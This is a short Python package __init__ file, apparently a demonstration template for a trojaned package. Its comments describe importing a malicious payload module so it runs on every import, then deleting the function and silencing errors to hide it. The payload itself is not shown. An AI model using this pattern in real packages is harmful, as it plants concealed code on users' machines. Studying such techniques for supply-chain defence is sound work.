__version__ = "0.1.0"

# suppose this part is non-malicious code as in original package
from .greet import *

# insert malicious module here so it will be run whenever the package is imported.
# delete the payload() function after execution 

try:
    from .payload import *
    del payload
except:
    print()

# suppose this part is non-malicious code as in original package